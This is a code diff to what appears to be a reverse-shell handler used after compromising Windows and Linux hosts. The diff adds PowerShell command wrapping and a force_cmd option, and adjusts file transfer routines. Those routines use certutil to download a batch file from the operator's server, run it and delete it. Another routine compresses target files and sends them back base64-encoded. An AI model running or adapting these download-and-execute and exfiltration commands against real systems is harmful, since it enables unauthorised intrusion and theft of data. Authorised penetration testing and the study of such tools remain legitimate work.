@@ -341,6 +341,7 @@ class BetterCMD:
 		self.banner = banner
 		self.cmdqueue = []
 		self.completekey = 'tab'
+		self.lastcmd = ''
 
 	def cmdloop(self):
 		self.preloop()
@@ -371,12 +372,13 @@ class BetterCMD:
 		if line:
 			try:
 				func = getattr(self, 'do_' + cmd)
+				self.lastcmd = line
 			except AttributeError:
-				return self.default(cmd)
+				return self.default(line)
 			return func(arg)
 
-	def default(self, cmd):
-		logger.error(f"Command {cmd} does not exist")
+	def default(self, line):
+		logger.error(f"Invalid command")
 
 	def parseline(self, line):
 		line = line.lstrip()
@@ -1200,8 +1202,6 @@ class MainMenu(BetterCMD):
 			return self.onecmd('exit')
 		elif line == '.':
 			return self.onecmd('dir')
-		elif line in ('recon', 'batch'):
-			logger.warning("This command is deprecated. Check the 'run' command")
 		else:
 			parts = line.split()
 			candidates = [command for command in self.raw_commands if command.startswith(parts[0])]
@@ -1958,7 +1958,7 @@ class Session:
 				else:
 					self._cwd = self.control_session.exec(f"readlink -f /proc/{self.shell_pid}/cwd", value=True)
 			elif self.OS == 'Windows':
-				self._cwd = self.exec("cmd /c cd", value=True)
+				self._cwd = self.exec("cd", force_cmd=True, value=True)
 
 		return self._cwd
 
@@ -2035,7 +2035,7 @@ class Session:
 					logger.debug(f"Available writable directory on target: {paint(self._tmp).RED}")
 
 			elif self.OS == "Windows":
-				self._tmp = "%TEMP%"
+				self._tmp = self.exec("echo %TEMP%", force_cmd=True, value=True)
 
 		return self._tmp
 
@@ -2191,6 +2191,7 @@ class Session:
 					# --- Agent only args ---
 		agent_typing=False,	# Simulate typing on shell
 		python=False,		# Execute python command
+		force_cmd=False,	# Execute cmd command from powershell
 		stdin_src=None,		# stdin stream source
 		stdout_dst=None,	# stdout stream destination
 		stderr_dst=None,	# stderr stream destination
@@ -2339,6 +2340,8 @@ class Session:
 
 			# Constructing the payload
 			if cmd is not None:
+				if force_cmd and self.subtype == 'psh':
+					cmd = f"cmd /c '{cmd}'"
 				initial_cmd = cmd
 				cmd = cmd.encode()
 
@@ -2362,15 +2365,18 @@ class Session:
 
 					elif self.OS == 'Windows': # TODO fix logic
 						if self.subtype == 'cmd':
-							sep = '&'
+							cmd = (
+								f"set {token[0]}={token[1]}&set {token[2]}={token[3]}\r\n"
+								f"echo %{token[0]}%%{token[2]}%&{cmd.decode()}&"
+								f"echo %{token[2]}%%{token[0]}%\r\n".encode()
+							)
 						elif self.subtype == 'psh':
-							sep = ';'
-						cmd = (
-							f"set {token[0]}={token[1]}{sep}set {token[2]}={token[3]}\r\n"
-							f"echo %{token[0]}%%{token[2]}%{sep}{cmd.decode()}{sep}"
-							f"echo %{token[2]}%%{token[0]}%\r\n".encode()
-						)
-						if len(cmd) > MAX_CMD_PROMPT_LEN:
+							cmd = (
+								f"$env:{token[0]}=\"{token[1]}\";$env:{token[2]}=\"{token[3]}\"\r\n"
+								f"echo $env:{token[0]}$env:{token[2]};{cmd.decode()};"
+								f"echo $env:{token[2]}$env:{token[0]}\r\n".encode()
+							)
+						if len(cmd) > MAX_CMD_PROMPT_LEN: # TODO check the maxlength on powershell
 							logger.error("Max cmd prompt length: {MAX_CMD_PROMPT_LEN} characters")
 							return False
 
@@ -2915,7 +2921,7 @@ class Session:
 			tempfile_bat = f'/dev/shm/{rand(16)}.bat'
 			remote_items_ps = r'\", \"'.join(shlex.split(remote_items))
 			cmd = (
-				f'@powershell -command "$archivepath=\\"{remote_tempfile}\\";compress-archive -path \\"{remote_items_ps}\\"'
+				f'@powershell -command "$archivepath=\'{remote_tempfile}\';compress-archive -path \'{remote_items_ps}\''
 				' -DestinationPath $archivepath;'
 				'$b64=[Convert]::ToBase64String([IO.File]::ReadAllBytes($archivepath));'
 				'Remove-Item $archivepath;'
@@ -2930,9 +2936,11 @@ class Session:
 			server.start()
 			data = self.exec(
 				f'certutil -urlcache -split -f "http://{self._host}:{server.port}{urlpath_bat}" "%TEMP%\\{temp_remote_file_bat}" >NUL 2>&1&"%TEMP%\\{temp_remote_file_bat}"&del "%TEMP%\\{temp_remote_file_bat}"',
-				value=True, timeout=None)
+				force_cmd=True, value=True, timeout=None)
 			server.stop()
 
+			if not data:
+				return []
 			downloaded = set()
 			try:
 				with zipfile.ZipFile(io.BytesIO(base64.b64decode(data)), 'r') as zipdata:
@@ -3166,7 +3174,7 @@ class Session:
 			urlpath_zip = server.add(tempfile_zip)
 
 			cwd_escaped = self.cwd.replace('\\', '\\\\')
-			tmp_escaped = self.exec("echo %TEMP%", value=True).replace('\\', '\\\\')
+			tmp_escaped = self.tmp.replace('\\', '\\\\')
 			temp_remote_file_zip = urlpath_zip.split("/")[-1]
 
 			fetch_cmd = f'certutil -urlcache -split -f "http://{self._host}:{server.port}{urlpath_zip}" "%TEMP%\\{temp_remote_file_zip}" && echo DOWNLOAD OK'
@@ -3181,8 +3189,11 @@ class Session:
 			server.start()
 			response = self.exec(
 				f'certutil -urlcache -split -f "http://{self._host}:{server.port}{urlpath_bat}" "%TEMP%\\{temp_remote_file_bat}"&"%TEMP%\\{temp_remote_file_bat}"&del "%TEMP%\\{temp_remote_file_bat}"',
-				value=True, timeout=None)
+				force_cmd=True, value=True, timeout=None)
 			server.stop()
+			if not response:
+				logger.error("Upload initialization failed...")
+				return []
 			if not "DOWNLOAD OK" in response:
 				logger.error("Data transfer failed...")
 				return []
